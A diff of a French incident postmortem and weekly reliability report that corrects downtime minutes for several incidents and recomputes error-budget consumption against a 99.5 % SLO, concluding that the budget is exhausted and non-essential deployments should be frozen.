 configuration du frontal web par une configuration par défaut. Aucune donnée
 perdue.
 
 ## Impact
-- Indisponibilité : de 06:04 (fin de la fenêtre de MAJ) à 08:45. Détecté 08:04.
+- Indisponibilité : de 06:04 (fin de la fenêtre de MAJ) à 08:45 (161 min).
+  Détecté 08:10.
 - Services touchés : accès web HTTPS au portail ; l'API interne a continué de
   tourner.
 - Utilisateurs : tous les utilisateurs web pendant la plage (démarrage lent le
@@ -1667,13 +1678,13 @@ perdue.
 |---|---|---|
 | 03:30 | fenêtre de mises à jour automatiques | journal apt |
 | 06:04 | reload nginx avec la conf par défaut | journal nginx |
-| 08:04 | alerte ProbeFailed HTTPS | Prometheus |
+| 08:10 | alerte ProbeFailed HTTPS | Prometheus |
 | 08:12 | prise en charge, constat (80=défaut, 443=absent) | journal de bord |
 | 08:30 | cause identifiée (.dpkg-old) | journal de bord |
 | 08:45 | vhost restauré, HTTPS rétabli | check_PC_5_2 |
 
 ## Détection
-Alerte automatique `ProbeFailed` à 08:04, soit ~2 h après le début réel (06:04) :
+Alerte automatique `ProbeFailed` à 08:10, soit ~2 h après le début réel (06:04) :
 la sonde HTTPS n'était pas assez fréquente / pas remontée la nuit. Délai non
 acceptable — action de détection ci-dessous.
 
@@ -1747,7 +1758,7 @@ qui protège.
 
 | Ticket | Type | P | Indispo (min) | Cause racine | Amélioration |
 |---|---|---|---|---|---|
-| PC.1.1 | incident | 1 | 25 | certificat non renouvelé | renouvellement auto + alerte J-21 |
+| PC.1.1 | incident | 1 | 330 | certificat non renouvelé | renouvellement auto + alerte J-21 |
 | PC.1.2 | incident | 1 | 16 | max_connections abaissé + sessions zombies | idle_in_transaction_timeout |
 | PC.1.3 | changement | 3 | 0 | — | conf versionnée |
 | PC.1.4 | incident | 1 | 18 | port réécrit par le déploiement | smoke test post-déploiement |
@@ -1757,42 +1768,42 @@ qui protège.
 | PC.2.4 | changement | 3 | 0 | — | purge planifiée |
 | PC.3.1 | incident | 1 | 0 | auth mot de passe laissée | PasswordAuthentication no |
 | PC.3.2 | incident | 2 | 0 | rotation de clé à moitié | procédure add-then-remove |
-| PC.3.3 | incident | 1 | 27 | /etc/hosts nettoyé | conf réseau sous gestion |
+| PC.3.3 | incident | 1 | 147 | /etc/hosts nettoyé | conf réseau sous gestion |
 | PC.4.1 | changement | 3 | 0 | — | règle ufw restreinte |
 | PC.4.2 | incident | 2 | 12 | horloge dérivée | supervision offset NTP |
 | PC.4.3 | incident | 2 | 0 | Redis sans maxmemory | maxmemory + alerte |
 | PC.4.4 | incident | 3 | 0 | healthcheck trop strict | seuils réalistes |
 | PC.5.1 | changement | 3 | 0 | — | rôle moindre privilège |
-| PC.5.2 | incident | 1 | 41 | conffile remplacé par MAJ | /etc/nginx sous git |
+| PC.5.2 | incident | 1 | 161 | conffile remplacé par MAJ | /etc/nginx sous git |
 | PC.5.3 | incident | 2 | 0 | inodes épuisés | supervision df -i |
 
 ### Disponibilité contre le SLO
 
 Minutes d'indisponibilité **réelles** de la semaine (colonne indispo, les
-changements bien menés comptent 0) :
-25 + 16 + 18 + 27 + 12 + 41 = **139 minutes**.
+changements bien menés comptent 0). « Réelles » veut dire **du début de la panne au rétablissement**, pas depuis la prise en charge : PC.1.1 de 03 :00 (expiration) à 08 :
+30, PC.3.3 de 12 :00 à 14 :27, PC.5.2 de 06 :04 à 08 :45 : 330 + 16 + 18 + 147 + 12 + 161 = **684 minutes**.
 
-* Budget d'erreur mensuel (SLO 99,5 % sur 43 200 min) : **216 min**.
-* Déjà consommé avant lundi : 43 min. Consommé cette semaine : 139 min.
-* Total consommé : 43 + 139 = **182 min sur 216**, soit **84 % du budget**.
+* Budget d'erreur mensuel (SLO 99,5 % sur 43 200 min) : 0,5 % × 43 200 = **216 min**.
+* Déjà consommé avant lundi : 43 min. Consommé cette semaine : 684 min.
+* Total consommé : 43 + 684 = **727 min sur 216**, soit **337 % du budget** : il est épuisé, et dépassé de 511 min. Disponibilité sur la fenêtre de 30 jours : (43 200 − 727) / 43 200 = **98,32 %**, sous le SLO de 99,5 %.
 * Disponibilité de la semaine seule (base 7 j = 10 080 min) :
-  (10 080 − 139) / 10 080 = **98,62 %** — **sous** le SLO hebdomadaire.
+  (10 080 − 684) / 10 080 = **93,21 %** — très loin des 99,5 %.
 
 ::: pourquoi
 Le budget d'erreur est le complément du SLO : 99,5 % de dispo autorise 0,5 %
 d'indisponibilité, soit ~216 min sur 30 jours. On le consomme avec les minutes
 **réellement** indisponibles (les incidents P1 surtout ; une demande de
 changement menée sans coupure ne consomme rien). Raisonner en budget transforme
-la fiabilité en quantité gérable : à 84 % consommé et une semaine encore à faire,
-la marge est faible — c'est un signal d'arbitrage, pas une note de blâme.
+la fiabilité en quantité gérable : à 337 % consommé,
+la question n' est plus « a-t-on de la marge? » mais « qu'arrête-t-on? » — c'est un signal d'arbitrage, pas une note de blâme. Noter aussi d'où viennent ces minutes : trois incidents seulement (PC.1.1, PC.3.3, PC.5.2) font 93 % du total, et l'essentiel est du temps **avant** la prise en charge.
 :::
 
 ### Budget d'erreur : décision
 
-À 182/216 (84 %) avec une semaine restante et un rythme récent de ~139 min/semaine,
-le budget sera dépassé avant la fin du mois. Recommandation : **gel des
-déploiements non essentiels** et priorité aux trois automatisations de détection
-ci-dessous jusqu'au retour sous 70 % de budget consommé. Les changements urgents
+À 727/216 (337 %),
+le budget est épuisé : la règle d'équipe s'applique sans discussion. Recommandation : **gel des
+déploiements non essentiels** et priorité absolue aux trois automatisations de détection
+ci-dessous, jusqu'à ce que la fenêtre glissante de 30 jours repasse sous le budget (les minutes de cette semaine en sortent dans un mois). Les changements urgents
 restent possibles avec smoke test obligatoire.
 
 ### Trois actions d'amélioration et leur automatisation
@@ -1805,9 +1816,9 @@ restent possibles avec smoke test obligatoire.
 
 ::: pourquoi
 Les trois améliorations à plus fort levier de la semaine ne sont pas des
-correctifs ponctuels mais des **boucles de détection** : la moitié du temps
-d'indisponibilité vient du délai entre le début réel et la détection (certificat
-expiré à 03:14 vu à 08:02, HTTPS perdu à 06:04 vu à 08:04). Une sonde qui teste
+correctifs ponctuels mais des **boucles de détection** : près de 80 % du temps
+d'indisponibilité (543 min sur 684) s'écoule entre le début réel et la prise en charge (certificat
+expiré à 03:00 traité à 08:02, DNS cassé à 12 :00 vu à 13 :55, HTTPS perdu à 06:04 vu à 08:10). Une sonde qui teste
 ce que voit l'utilisateur (dispo, validité TLS) raccourcit le MTTD ; le
 versionnage des confs détecte les dérives et écrasements ; le smoke test
 post-déploiement empêche un changement de partir en prod cassé. Chacune a une
